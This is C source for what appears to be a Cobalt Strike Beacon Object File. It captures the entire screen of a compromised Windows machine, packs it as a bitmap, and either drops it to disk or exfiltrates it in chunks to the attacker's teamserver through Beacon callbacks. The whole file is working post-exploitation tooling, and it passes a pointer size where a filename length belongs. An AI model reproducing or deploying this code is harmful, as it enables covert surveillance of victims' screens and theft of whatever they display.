#include <windows.h>
#include <stdio.h>
#include "bofdefs.h"

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")

char downloadfilename[] = "screenshot.bmp";
/*Download File*/
void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize) {

    //Intializes random number generator to create fileId 
    time_t t;
    MSVCRT$srand((unsigned)MSVCRT$time(&t));
    int fileId = MSVCRT$rand();

    //8 bytes for fileId and fileSize
    int messageLength = downloadFileNameLength + 8;
    char* packedData = (char*)MSVCRT$malloc(messageLength);

    //pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 24) & 0xFF;
    packedData[1] = (fileId >> 16) & 0xFF;
    packedData[2] = (fileId >> 8) & 0xFF;
    packedData[3] = fileId & 0xFF;

    //pack on fileSize as 4-byte int second
    packedData[4] = (fileSize >> 24) & 0xFF;
    packedData[5] = (fileSize >> 16) & 0xFF;
    packedData[6] = (fileSize >> 8) & 0xFF;
    packedData[7] = fileSize & 0xFF;

    int packedIndex = 8;

    //pack on the file name last
    for (int i = 0; i < downloadFileNameLength; i++) {
        packedData[packedIndex] = fileName[i];
        packedIndex++;
    }

    BeaconOutput(CALLBACK_FILE, packedData, messageLength);

    if (fileSize > (1024 * 900)) {

        //Lets see how many times this constant goes into our file size, then add one (because if it doesn't go in at all, we still have one chunk)
        int numOfChunks = (fileSize / (1024 * 900)) + 1;
        int index = 0;
        int chunkSize = 1024 * 900;

        while (index < fileSize) {
            if (fileSize - index > chunkSize) {//We have plenty of room, grab the chunk and move on

                /*First 4 are the fileId
            then account for length of file
            then a byte for the good-measure null byte to be included
                then lastly is the 4-byte int of the fileSize*/
                int chunkLength = 4 + chunkSize;
                char* packedChunk = (char*)MSVCRT$malloc(chunkLength);

                //pack on fileId as 4-byte int first
                packedChunk[0] = (fileId >> 24) & 0xFF;
                packedChunk[1] = (fileId >> 16) & 0xFF;
                packedChunk[2] = (fileId >> 8) & 0xFF;
                packedChunk[3] = fileId & 0xFF;

                int chunkIndex = 4;

                //pack on the file name last
                for (int i = index; i < index + chunkSize; i++) {
                    packedChunk[chunkIndex] = returnData[i];
                    chunkIndex++;
                }

                BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);

            }
            else {//This chunk is smaller than the chunkSize, so we have to be careful with our measurements

                int lastChunkLength = fileSize - index + 4;
                char* lastChunk = (char*)MSVCRT$malloc(lastChunkLength);

                //pack on fileId as 4-byte int first
                lastChunk[0] = (fileId >> 24) & 0xFF;
                lastChunk[1] = (fileId >> 16) & 0xFF;
                lastChunk[2] = (fileId >> 8) & 0xFF;
                lastChunk[3] = fileId & 0xFF;
                int lastChunkIndex = 4;

                //pack on the file name last
                for (int i = index; i < fileSize; i++) {
                    lastChunk[lastChunkIndex] = returnData[i];
                    lastChunkIndex++;
                }
                BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
            }

            index = index + chunkSize;

        }

    }
    else {

        /*first 4 are the fileId
        then account for length of file
        then a byte for the good-measure null byte to be included
        then lastly is the 4-byte int of the fileSize*/
        int chunkLength = 4 + fileSize;
        char* packedChunk = (char*)MSVCRT$malloc(chunkLength);

        //pack on fileId as 4-byte int first
        packedChunk[0] = (fileId >> 24) & 0xFF;
        packedChunk[1] = (fileId >> 16) & 0xFF;
        packedChunk[2] = (fileId >> 8) & 0xFF;
        packedChunk[3] = fileId & 0xFF;
        int chunkIndex = 4;

        //pack on the file name last
        for (int i = 0; i < fileSize; i++) {
            packedChunk[chunkIndex] = returnData[i];
            chunkIndex++;
        }

        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
    }


    //We need to tell the teamserver that we are done writing to this fileId
    char packedClose[4];

    //pack on fileId as 4-byte int first
    packedClose[0] = (fileId >> 24) & 0xFF;
    packedClose[1] = (fileId >> 16) & 0xFF;
    packedClose[2] = (fileId >> 8) & 0xFF;
    packedClose[3] = fileId & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);

    return;
}

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line,  char* msg, HRESULT hr) {
#ifdef BOF
	BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line,  msg, hr);
#else
	printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
#endif // BOF

	return FALSE;
}
#pragma endregion


BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
{
    HDC hDC;
    int iBits;
    WORD wBitCount;
    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0, dwWritten = 0;
    BITMAP Bitmap0;
    BITMAPFILEHEADER bmfHdr;
    BITMAPINFOHEADER bi;
    LPBITMAPINFOHEADER lpbi;
    HANDLE fh, hDib, hPal, hOldPal2 = NULL;
    hDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
    DeleteDC(hDC);
    if (iBits <= 1)
        wBitCount = 1;
    else if (iBits <= 4)
        wBitCount = 4;
    else if (iBits <= 8)
        wBitCount = 8;
    else
        wBitCount = 24;
    GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = Bitmap0.bmWidth;
    bi.biHeight = -Bitmap0.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = wBitCount;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrImportant = 0;
    bi.biClrUsed = 256;
    dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8
        * Bitmap0.bmHeight;
    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
    *lpbi = bi;

    hPal = GetStockObject(DEFAULT_PALETTE);
    if (hPal)
    {
        hDC = GetDC(NULL);
        hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
        RealizePalette(hDC);
    }


    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER)
        + dwPaletteSize, (BITMAPINFO*)lpbi, DIB_RGB_COLORS);

    if (hOldPal2)
    {
        SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
        RealizePalette(hDC);
        ReleaseDC(NULL, hDC);
    }

    //fh = CreateFile(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);

    //if (fh == INVALID_HANDLE_VALUE)
    //    return FALSE;

    bmfHdr.bfType = 0x4D42; // "BM"
    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
    bmfHdr.bfSize = dwDIBSize;
    bmfHdr.bfReserved1 = 0;
    bmfHdr.bfReserved2 = 0;
    bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
    void* bmpdata = malloc(sizeof(BITMAPFILEHEADER) + dwDIBSize);
    memcpy(bmpdata, &bmfHdr, sizeof(BITMAPFILEHEADER));
    memcpy(((char*)bmpdata) + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);

    if (savemethod == 0) {
        BeaconPrintf(0x0, "[*] Saving bitmap to disk with filename %s", lpszFileName);
        fh = CreateFile(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);

        if (fh == INVALID_HANDLE_VALUE)
            return FALSE;
        WriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER)+ dwDIBSize, &dwWritten, NULL);
        CloseHandle(fh);
    }
    else{
        BeaconPrintf(0x0, "[*] Downloading bitmap over beacon with filename %s", lpszFileName);
        downloadFile((char*)lpszFileName, sizeof(lpszFileName), (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
    }
    
    

    /* clean up */
    GlobalUnlock(hDib);
    GlobalFree(hDib);
    //CloseHandle(fh);
    return TRUE;
}

#ifdef BOF
void go(char* buff, int len) {
    datap  parser;
    char * downloadfilename;
    BeaconDataParse(&parser, buff, len);
    //what should the file be named?
    downloadfilename = BeaconDataExtract(&parser, NULL);
    //how should it be saved?
    //0 - drop to disk
    //1 - download as file in cobaltstrike
    //2 - NOT IMPLEMENTED YET - planned to be screenshot callback, refer to branch.
    int savemethod = BeaconDataInt(&parser);
    int x1, y1, x2, y2, w, h;
    // get screen dimensions
    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    w = x2 - x1;
    h = y2 - y1;

    // copy screen to bitmap
    HDC     hScreen = GetDC(NULL);
    HDC     hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);

    //I was going to pull from the clipboard but then realized it
    //was more trouble than it was worth, so I just saved it to a file. ~ CodeX
    /*
    // save bitmap to clipboard
    OpenClipboard(NULL);
    EmptyClipboard();
    SetClipboardData(CF_BITMAP, hBitmap);
    CloseClipboard();
    */
    BeaconPrintf(0x0, "[*] Screen saved to bitmap");
    LPCSTR filename = (LPCSTR)downloadfilename;
    SaveHBITMAPToFile(hBitmap, (LPCTSTR)filename,savemethod);

    //BeaconPrintf(0x0, "[+] Printscreen bitmap saved to %s",downloadfilename);
    // clean up
    SelectObject(hDC, old_obj);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);
}


#else

void main(int argc, char* argv[]) {

}

#endif